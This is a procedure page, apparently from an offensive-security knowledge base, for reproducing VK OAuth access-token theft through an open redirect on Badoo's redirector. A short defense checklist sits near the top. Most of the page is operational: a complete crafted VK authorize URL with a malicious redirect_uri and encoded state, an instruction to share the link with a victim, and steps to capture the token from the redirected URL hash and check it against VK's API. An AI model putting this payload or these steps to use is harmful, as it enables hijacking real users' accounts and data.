---
id: proc-003
tags:
  - open-redirect
  - oauth
  - vk
type: procedure
tools: []
tactics:
  - '[[Credential Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[T1528.001]]'
updated_at: '2025-12-14T17:24:26.808Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Credential Access]]'
mitre_techniques:
  - '[[T1528.001]]'
---
# Reproduce-Token-Theft-with-VK-OAuth

## Summary

This procedure replicates the open redirect exploit against VK OAuth to steal VK access tokens, demonstrating the vulnerability's scope beyond Facebook.

## Description

VK OAuth uses a similar implicit flow with response_type=token. The same crafted redirect_uri is passed to VK's authorize endpoint. Upon authentication, VK redirects with the token in the hash, which the Badoo redirector forwards to the attacker's domain without validation.

## Requirements

1. Base64-encoded malicious state from prior procedures
2. Victim with VK-linked Badoo account
3. Attacker domain for token capture

## Defense

Defensive measures and detection strategies:

- Apply domain whitelisting to all OAuth redirect_uris
- Parse and validate full URL paths, rejecting appended segments
- Audit OAuth client configurations for permissive redirect allowances
- Detect cross-provider OAuth anomalies in access logs

## Objectives

1. Initiate VK OAuth with malicious redirect
2. Capture VK access_token
3. Access victim VK data (e.g., email, photos)

## Instructions

### Step 1: Construct VK OAuth URL

**Context**: Build the VK authorization URL using the same redirect_uri.

Use this URL:

```url
https://oauth.vk.com/authorize?response_type=token&display=popup&client_id=2396364&scope=email%2Cphotos&redirect_uri=https%3A%2F%2Fbadoo.com%2Fexternal%2Fredirector.phtml%3fstate%3DaHR0cHM6Ly93d3cuZ29vZ2xlLmNvbSUyZi5iYWRvby5jb20v
```

> Share with victim to trigger authentication.

### Step 2: Authenticate and Capture

**Context**: Complete VK login and intercept the token.

After authentication, capture the redirected URL hash:

```url
https://www.google.com/.badoo.com/#access_token=[vk_user_access_token]&expires_in=[number]&user_id=[id]
```

Extract via JavaScript as in Facebook procedure.

> Validate token with VK API, e.g., https://api.vk.com/method/users.get?access_token=TOKEN.

## MITRE ATT&CK Mapping

### Tactics

- [[Credential Access]]

### Techniques

- [[T1528.001]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[open-redirect]]
- [[oauth]]
- [[vk]]
